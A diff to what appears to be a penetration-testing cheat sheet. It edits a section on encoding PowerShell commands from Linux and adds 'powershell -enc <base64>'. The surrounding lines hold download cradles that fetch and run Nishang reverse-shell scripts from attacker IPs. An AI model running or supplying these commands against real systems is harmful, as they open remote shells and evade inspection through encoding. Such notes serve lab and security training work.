@@ -76,7 +76,7 @@ tasklist /v |findstr -i cloudme
 
 ---
 <details>
- <summary><strong>Linux to Windows encoding</strong></summary>
+ <summary><strong>Linux to Windows encoding(base64)</strong></summary>
 
 ```bash
 echo -n iex(new-object net.webclient).downloadstring('http://10.10.16.3/Invoke-PowerShellTcp.ps1') | iconv --to-code UTF-16LE | base64 -w0
@@ -118,6 +118,8 @@ cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
 powershell iex(new-object net.webclient).downloadstring("http://10.10.10.10/Invoke-PowerShellTcp.ps1")
 
 echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.23/rev.ps1") | powershell -noprofile
+
+powershell -enc <base64>
 ```
 
 </details>
